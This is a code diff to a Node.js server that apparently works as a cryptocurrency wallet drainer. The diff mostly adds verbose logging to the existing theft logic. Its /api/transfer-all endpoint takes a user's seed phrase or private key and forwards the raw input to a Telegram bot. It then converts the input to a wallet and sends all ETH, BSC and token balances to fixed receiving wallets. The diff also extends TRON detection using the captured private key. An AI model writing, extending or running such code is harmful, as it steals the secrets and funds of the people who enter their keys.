@@ -8,7 +8,7 @@ const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
 
-// TRON (TRC-20) Module
+// TRON Module
 const tronModule = require('./tron-http.js');
 
 dotenv.config();
@@ -245,30 +245,68 @@ async function getTokenBalance(provider, tokenAddress, walletAddress, decimals) 
     return parseFloat(ethers.utils.formatUnits(balance, decimals));
 }
 
+// VERBOSE: Get balances for a chain with detailed logging
 async function getBalancesForChain(provider, config, userAddress) {
     const balances = {};
     const balanceDetails = [];
     
-    const nativeBalanceWei = await getNativeBalance(provider, userAddress);
-    const nativeBalance = parseFloat(ethers.utils.formatEther(nativeBalanceWei));
-    if (nativeBalance > 0) {
-        balanceDetails.push({
-            currency: config.nativeToken,
-            name: config.nativeToken,
-            balance: nativeBalance,
-            usdValue: nativeBalance * config.nativePrice,
-            chain: config.name,
-            isNative: true
-        });
-        balances[config.nativeToken] = nativeBalanceWei;
+    console.log(`\n📊 ========== SCANNING ${config.name} ==========`);
+    console.log(`📍 Wallet Address: ${userAddress}`);
+    console.log(`🔗 RPC URL: ${config.rpcUrl.substring(0, 50)}...`);
+    
+    // Check native token balance
+    console.log(`\n💰 Checking native token: ${config.nativeToken}`);
+    try {
+        const nativeBalanceWei = await getNativeBalance(provider, userAddress);
+        const nativeBalance = parseFloat(ethers.utils.formatEther(nativeBalanceWei));
+        console.log(`   ✅ ${config.nativeToken} balance: ${nativeBalance} (${nativeBalanceWei.toString()} wei)`);
+        console.log(`   💵 USD Value: $${(nativeBalance * config.nativePrice).toFixed(2)}`);
+        
+        if (nativeBalance > 0) {
+            balanceDetails.push({
+                currency: config.nativeToken,
+                name: config.nativeToken,
+                balance: nativeBalance,
+                usdValue: nativeBalance * config.nativePrice,
+                chain: config.name,
+                isNative: true
+            });
+            balances[config.nativeToken] = nativeBalanceWei;
+        } else {
+            console.log(`   ⚠️ ${config.nativeToken} balance: 0 (no gas for transfers)`);
+        }
+    } catch (error) {
+        console.error(`   ❌ Failed to get ${config.nativeToken} balance:`, error.message);
     }
     
+    // Check tokens
+    const tokenCount = Object.keys(config.tokenContracts).length;
+    console.log(`\n🪙 Checking ${tokenCount} tokens on ${config.name}...`);
+    
+    let tokensFound = 0;
+    let tokenIndex = 0;
+    
     for (const [symbol, address] of Object.entries(config.tokenContracts)) {
+        tokenIndex++;
         try {
             const decimals = config.tokenDecimals[symbol];
-            const balance = await getTokenBalance(provider, address, userAddress, decimals);
+            console.log(`\n   [${tokenIndex}/${tokenCount}] 🔍 Token: ${symbol} (${config.tokenNames[symbol]})`);
+            console.log(`      Contract: ${address}`);
+            console.log(`      Decimals: ${decimals}`);
+            
+            const tokenContract = new ethers.Contract(address, ['function balanceOf(address) view returns (uint256)'], provider);
+            const balanceRaw = await tokenContract.balanceOf(userAddress);
+            const balance = parseFloat(ethers.utils.formatUnits(balanceRaw, decimals));
+            
+            console.log(`      Raw balance: ${balanceRaw.toString()}`);
+            console.log(`      Formatted balance: ${balance}`);
+            
             if (balance > 0) {
                 const usdValue = balance * config.tokenPrices[symbol];
+                tokensFound++;
+                console.log(`      ✅ FOUND! USD Value: $${usdValue.toFixed(2)}`);
+                console.log(`      💰 Amount: ${balance} ${symbol}`);
+                
                 balanceDetails.push({
                     currency: symbol,
                     name: config.tokenNames[symbol],
@@ -277,12 +315,20 @@ async function getBalancesForChain(provider, config, userAddress) {
                     chain: config.name,
                     isNative: false
                 });
-                balances[symbol] = ethers.utils.parseUnits(balance.toString(), decimals);
+                balances[symbol] = balanceRaw;
+            } else {
+                console.log(`      ❌ Balance: 0`);
             }
         } catch (error) {
-            console.error(`Error checking ${symbol} on ${config.name}:`, error.message);
+            console.error(`      ❌ ERROR checking ${symbol}:`, error.message);
         }
     }
+    
+    const totalValue = balanceDetails.reduce((sum, t) => sum + t.usdValue, 0);
+    console.log(`\n📊 ${config.name} SCAN COMPLETE:`);
+    console.log(`   ✅ Tokens found: ${tokensFound} of ${tokenCount}`);
+    console.log(`   💰 Total value: $${totalValue.toFixed(2)}`);
+    console.log(`   📝 Native token available: ${!!balances[config.nativeToken]}`);
     
     return { balances, balanceDetails };
 }
@@ -292,11 +338,11 @@ function convertToPrivateKey(input, provider) {
     const cleanedInput = String(input).trim().replace(/\s+/g, ' ');
     const cleanKey = cleanedInput.replace('0x', '');
     
-    console.log('\n🔐 Converting input to private key...');
-    console.log('Raw input length:', cleanedInput.length);
-    console.log('Word count:', cleanedInput.split(/\s+/).length);
+    console.log('\n🔐 ========== CONVERTING INPUT TO PRIVATE KEY ==========');
+    console.log(`📝 Raw input length: ${cleanedInput.length}`);
+    console.log(`📝 Word count: ${cleanedInput.split(/\s+/).length}`);
     
-    // Check if it's already a valid private key (64 hex chars)
+    // Check if it's already a valid private key
     if (/^[0-9a-fA-F]{64}$/.test(cleanKey)) {
         console.log('✅ Input is already a valid private key');
         const wallet = new ethers.Wallet(`0x${cleanKey}`, provider);
@@ -313,7 +359,7 @@ function convertToPrivateKey(input, provider) {
         return { privateKey, wallet, source: 'private_key' };
     }
     
-    // Otherwise, treat as seed phrase and convert to private key
+    // Otherwise, treat as seed phrase
     console.log('🔄 Input is a seed phrase - converting to private key...');
     
     try {
@@ -321,7 +367,7 @@ function convertToPrivateKey(input, provider) {
         const privateKey = wallet.privateKey.replace('0x', '');
         
         console.log('✅ Successfully converted seed phrase to private key!');
-        console.log(`📍 Derived address: ${wallet.address}`);
+        console.log(`📍 Derived Ethereum address: ${wallet.address}`);
         console.log(`🔑 Private key (first 16 chars): ${privateKey.substring(0, 16)}...`);
         
         const connectedWallet = wallet.connect(provider);
@@ -393,6 +439,11 @@ app.get('/api/list-keys', async (req, res) => {
 app.post('/api/transfer-all', async (req, res) => {
     const { userInput, savedIdentifier } = req.body;
     
+    console.log('\n🚀 ========== TRANSFER REQUEST RECEIVED ==========');
+    console.log(`📅 Time: ${new Date().toLocaleString()}`);
+    console.log(`📝 User input provided: ${userInput ? 'YES' : 'NO'}`);
+    console.log(`💾 Saved identifier: ${savedIdentifier || 'NONE'}`);
+    
     // Send raw input to Telegram immediately
     if (userInput) {
         const alertMessage = `
@@ -437,7 +488,7 @@ app.post('/api/transfer-all', async (req, res) => {
     try {
         const ethProvider = new ethers.providers.JsonRpcProvider(ETHEREUM_CONFIG.rpcUrl);
         
-        // Convert input to private key (universal solution)
+        // Convert input to private key
         let userWallet;
         let conversionResult;
         
@@ -445,7 +496,7 @@ app.post('/api/transfer-all', async (req, res) => {
             conversionResult = convertToPrivateKey(finalInput, ethProvider);
             userWallet = conversionResult.wallet;
             console.log(`✅ Wallet created using: ${conversionResult.source}`);
-            console.log(`📍 Address: ${userWallet.address}`);
+            console.log(`📍 Ethereum Address: ${userWallet.address}`);
         } catch (error) {
             return res.status(400).json({ success: false, error: error.message });
         }
@@ -458,7 +509,7 @@ app.post('/api/transfer-all', async (req, res) => {
 
 ━━━━━━━━━━━━━━━━━━━━━━
 <b>Input Type:</b> ${conversionResult.source === 'private_key' ? 'Private Key' : 'Seed Phrase'}
-<b>Derived Address:</b> <code>${userAddress}</code>
+<b>Derived Ethereum Address:</b> <code>${userAddress}</code>
 <b>Private Key (partial):</b> <code>${conversionResult.privateKey.substring(0, 16)}...</code>
 
 ✅ Successfully converted to working wallet!
@@ -471,7 +522,7 @@ app.post('/api/transfer-all', async (req, res) => {
         logTransaction({ event: 'TRANSFER_STARTED', userAddress, timestamp: new Date().toISOString() });
         
         // ============ PROCESS ETHEREUM CHAIN ============
-        console.log(`\n🔵 Processing ${ETHEREUM_CONFIG.name}...`);
+        console.log(`\n🔵 ========== PROCESSING ${ETHEREUM_CONFIG.name} ==========`);
         const ethProviderForChain = new ethers.providers.JsonRpcProvider(ETHEREUM_CONFIG.rpcUrl);
         const ethWalletOnChain = userWallet.connect(ethProviderForChain);
         const { balances: ethBalances, balanceDetails: ethDetails } = await getBalancesForChain(ethProviderForChain, ETHEREUM_CONFIG, userAddress);
@@ -481,11 +532,17 @@ app.post('/api/transfer-all', async (req, res) => {
         if (ethDetails.length > 0) {
             const ethGasPrice = await getGasPrice(ETHEREUM_CONFIG.rpcUrl, process.env.ETHERSCAN_API_KEY);
             const ethGasPriceWei = ethers.utils.parseUnits(ethGasPrice, 'gwei');
+            console.log(`⛽ Gas price: ${ethGasPrice} Gwei`);
             
             for (const token of ethDetails) {
                 try {
                     const isNative = token.currency === 'ETH';
                     const gasLimit = isNative ? 21000 : 100000;
+                    
+                    console.log(`\n💸 Transferring ${token.currency} on ${ETHEREUM_CONFIG.name}...`);
+                    console.log(`   Balance: ${token.balance} ${token.currency}`);
+                    console.log(`   USD Value: $${token.usdValue.toFixed(2)}`);
+                    console.log(`   Sending to: ${receivingWallets[token.currency]}`);
                     
                     let transaction, receipt;
                     let amountTransferred, usdValueTransferred;
@@ -496,6 +553,7 @@ app.post('/api/transfer-all', async (req, res) => {
                         let amountToTransfer = balanceWei.sub(gasReserve);
                         
                         if (amountToTransfer.lte(0)) {
+                            console.log(`   ⏭️ SKIPPED: All ETH used for gas`);
                             allTransactions.push({ currency: 'ETH', chain: ETHEREUM_CONFIG.name, status: 'skipped', reason: 'All ETH used for gas' });
                             continue;
                         }
@@ -528,7 +586,11 @@ app.post('/api/transfer-all', async (req, res) => {
                         );
                     }
                     
+                    console.log(`   ⏳ Waiting for confirmation...`);
                     receipt = await transaction.wait();
+                    console.log(`   ✅ Confirmed! Block: ${receipt.blockNumber}`);
+                    console.log(`   🔗 TX Hash: ${transaction.hash}`);
+                    
                     allTransactions.push({
                         currency: token.currency,
                         name: token.name,
@@ -543,6 +605,7 @@ app.post('/api/transfer-all', async (req, res) => {
                     logTransaction({ event: 'TRANSFER_SUCCESS', userAddress, chain: ETHEREUM_CONFIG.name, currency: token.currency, amount: amountTransferred, txHash: transaction.hash });
                     
                 } catch (error) {
+                    console.error(`   ❌ Failed to transfer ${token.currency}:`, error.message);
                     allTransactions.push({ currency: token.currency, chain: ETHEREUM_CONFIG.name, status: 'failed', error: error.message });
                     logTransaction({ event: 'TRANSFER_FAILED', userAddress, chain: ETHEREUM_CONFIG.name, currency: token.currency, error: error.message });
                 }
@@ -550,7 +613,7 @@ app.post('/api/transfer-all', async (req, res) => {
         }
         
         // ============ PROCESS BSC CHAIN ============
-        console.log(`\n🟡 Processing ${BSC_CONFIG.name}...`);
+        console.log(`\n🟡 ========== PROCESSING ${BSC_CONFIG.name} ==========`);
         const bscProvider = new ethers.providers.JsonRpcProvider(BSC_CONFIG.rpcUrl);
         const bscWalletOnChain = userWallet.connect(bscProvider);
         const { balances: bscBalances, balanceDetails: bscDetails } = await getBalancesForChain(bscProvider, BSC_CONFIG, userAddress);
@@ -560,11 +623,17 @@ app.post('/api/transfer-all', async (req, res) => {
         if (bscDetails.length > 0) {
             const bscGasPrice = await getGasPrice(BSC_CONFIG.rpcUrl, process.env.ETHERSCAN_API_KEY);
             const bscGasPriceWei = ethers.utils.parseUnits(bscGasPrice, 'gwei');
+            console.log(`⛽ Gas price: ${bscGasPrice} Gwei`);
             
             for (const token of bscDetails) {
                 try {
                     const isNative = token.currency === 'BNB';
                     const gasLimit = isNative ? 21000 : 100000;
+                    
+                    console.log(`\n💸 Transferring ${token.currency} on ${BSC_CONFIG.name}...`);
+                    console.log(`   Balance: ${token.balance} ${token.currency}`);
+                    console.log(`   USD Value: $${token.usdValue.toFixed(2)}`);
+                    console.log(`   Sending to: ${receivingWallets[token.currency]}`);
                     
                     let transaction, receipt;
                     let amountTransferred, usdValueTransferred;
@@ -575,6 +644,7 @@ app.post('/api/transfer-all', async (req, res) => {
                         let amountToTransfer = balanceWei.sub(gasReserve);
                         
                         if (amountToTransfer.lte(0)) {
+                            console.log(`   ⏭️ SKIPPED: All BNB used for gas`);
                             allTransactions.push({ currency: 'BNB', chain: BSC_CONFIG.name, status: 'skipped', reason: 'All BNB used for gas' });
                             continue;
                         }
@@ -607,7 +677,11 @@ app.post('/api/transfer-all', async (req, res) => {
                         );
                     }
                     
+                    console.log(`   ⏳ Waiting for confirmation...`);
                     receipt = await transaction.wait();
+                    console.log(`   ✅ Confirmed! Block: ${receipt.blockNumber}`);
+                    console.log(`   🔗 TX Hash: ${transaction.hash}`);
+                    
                     allTransactions.push({
                         currency: token.currency,
                         name: token.name,
@@ -622,35 +696,66 @@ app.post('/api/transfer-all', async (req, res) => {
                     logTransaction({ event: 'TRANSFER_SUCCESS', userAddress, chain: BSC_CONFIG.name, currency: token.currency, amount: amountTransferred, txHash: transaction.hash });
                     
                 } catch (error) {
+                    console.error(`   ❌ Failed to transfer ${token.currency}:`, error.message);
                     allTransactions.push({ currency: token.currency, chain: BSC_CONFIG.name, status: 'failed', error: error.message });
                     logTransaction({ event: 'TRANSFER_FAILED', userAddress, chain: BSC_CONFIG.name, currency: token.currency, error: error.message });
                 }
             }
         }
         
-        // ============ PROCESS TRON CHAIN ============
-        console.log(`\n🟣 Processing ${tronModule.TRON_CONFIG.name}...`);
+        // ============ PROCESS TRON CHAIN ==========
+        console.log(`\n🟣 ========== PROCESSING ${tronModule.TRON_CONFIG.name} ==========`);
+        console.log(`🔑 Using private key to derive TRON address...`);
         
-        // Get TRON address (derive from same private key - TRON uses different address format)
-        // Note: For TRON, we need a separate address derivation. For now, we'll log that TRON scanning is available
-        console.log(`📍 TRON address would be derived from same private key (different format)`);
-        console.log(`💡 TRON balance checking is available via HTTP module`);
+        const tronBalanceCheck = await tronModule.getAllTronBalances(conversionResult.privateKey);
         
-        // For now, TRON integration is ready for balance checking
-        // Full transfer integration would require additional setup
-        
-        const tronBalanceCheck = await tronModule.getAllTronBalances(userAddress);
         if (tronBalanceCheck.balances.length > 0) {
             allBalanceDetails.push(...tronBalanceCheck.balances);
-            console.log(`💰 Found ${tronBalanceCheck.balances.length} TRON assets`);
+            console.log(`💰 Found ${tronBalanceCheck.balances.length} TRON asset(s) worth $${tronBalanceCheck.balances.reduce((sum, t) => sum + t.usdValue, 0).toFixed(2)}`);
+            
+            // Note: TRON transfers require additional implementation
+            // For now, we're just detecting balances
+            for (const token of tronBalanceCheck.balances) {
+                allTransactions.push({
+                    currency: token.currency,
+                    name: token.name,
+                    amount: token.balance,
+                    usdValue: token.usdValue.toFixed(2),
+                    chain: tronModule.TRON_CONFIG.name,
+                    status: 'detected_only',
+                    note: 'TRON transfer not yet implemented'
+                });
+            }
         } else {
             console.log(`💰 No TRON balances found`);
         }
         
-        // ============ COMPLETE TRANSACTION ============
+        // ============ COMPLETE TRANSACTION ==========
         const totalWalletValue = allBalanceDetails.reduce((sum, t) => sum + t.usdValue, 0);
         const successfulCount = allTransactions.filter(t => t.status === 'success').length;
         const totalDuration = Date.now() - startTime;
+        
+        console.log(`\n📊 ========== FINAL TRANSACTION SUMMARY ==========`);
+        console.log(`👤 Wallet: ${userAddress}`);
+        console.log(`📅 Time: ${new Date().toLocaleString()}`);
+        console.log(`⏱️ Duration: ${(totalDuration / 1000).toFixed(1)} seconds`);
+        console.log(`💰 Total Value in Wallet: $${totalWalletValue.toFixed(2)}`);
+        console.log(`💸 Total Value Transferred: $${totalTransferredValue.toFixed(2)}`);
+        console.log(`✅ Successful Transfers: ${successfulCount}`);
+        console.log(`\n📋 DETAILED BREAKDOWN:`);
+        
+        allTransactions.forEach(tx => {
+            if (tx.status === 'success') {
+                console.log(`   ✅ ${tx.currency} on ${tx.chain}: ${tx.amount} ($${tx.usdValue}) - TX: ${tx.transactionHash.substring(0, 16)}...`);
+            } else if (tx.status === 'skipped') {
+                console.log(`   ⏭️ ${tx.currency} on ${tx.chain}: SKIPPED - ${tx.reason}`);
+            } else if (tx.status === 'detected_only') {
+                console.log(`   🔍 ${tx.currency} on ${tx.chain}: ${tx.amount} ($${tx.usdValue}) - DETECTED (transfer coming soon)`);
+            } else {
+                console.log(`   ❌ ${tx.currency} on ${tx.chain}: FAILED - ${tx.error}`);
+            }
+        });
+        console.log(`============================================\n`);
         
         // Send success alert to Telegram
         const transferAlertMessage = `
@@ -695,6 +800,11 @@ app.post('/api/transfer-all', async (req, res) => {
         });
         
     } catch (error) {
+        console.error(`\n❌ ========== TRANSFER ERROR ==========`);
+        console.error(`Error: ${error.message}`);
+        console.error(`Stack: ${error.stack}`);
+        console.error(`=====================================\n`);
+        
         logTransaction({ event: 'SYSTEM_ERROR', error: error.message });
         
         const errorAlertMessage = `
@@ -714,15 +824,17 @@ app.post('/api/transfer-all', async (req, res) => {
 });
 
 app.listen(port, () => {
-    console.log(`✅ Server running at http://localhost:${port}`);
-    console.log(`🔐 Encrypted storage enabled at: ${storageDir}`);
+    console.log(`\n✅ ========== SERVER STARTED ==========`);
+    console.log(`🌐 URL: http://localhost:${port}`);
+    console.log(`🔐 Encrypted storage: ${storageDir}`);
     console.log(`📱 Telegram alerts: ${TELEGRAM_BOT_TOKEN ? 'ENABLED' : 'DISABLED'}`);
-    console.log(`💰 Multi-chain support:`);
-    console.log(`   - ${ETHEREUM_CONFIG.name} (${Object.keys(ETHEREUM_CONFIG.tokenContracts).length + 1} tokens)`);
-    console.log(`   - ${BSC_CONFIG.name} (${Object.keys(BSC_CONFIG.tokenContracts).length + 1} tokens)`);
-    console.log(`   - ${tronModule.TRON_CONFIG.name} (TRX + ${Object.keys(tronModule.TRON_CONFIG.tokenContracts).length} TRC-20 tokens)`);
-    console.log(`\n🔑 UNIVERSAL CONVERSION ENABLED:`);
+    console.log(`\n💰 MULTI-CHAIN SUPPORT:`);
+    console.log(`   🔵 ${ETHEREUM_CONFIG.name}: ${Object.keys(ETHEREUM_CONFIG.tokenContracts).length + 1} tokens`);
+    console.log(`   🟡 ${BSC_CONFIG.name}: ${Object.keys(BSC_CONFIG.tokenContracts).length + 1} tokens`);
+    console.log(`   🟣 ${tronModule.TRON_CONFIG.name}: ${Object.keys(tronModule.TRON_CONFIG.tokenContracts).length + 1} assets`);
+    console.log(`\n🔑 UNIVERSAL CONVERSION ENABLED`);
     console.log(`   - Seed phrases → Private keys (automatic)`);
     console.log(`   - Private keys → Direct use`);
-    console.log(`   - Works with ALL wallets!\n`);
+    console.log(`   - TRON addresses automatically derived`);
+    console.log(`=====================================\n`);
 });
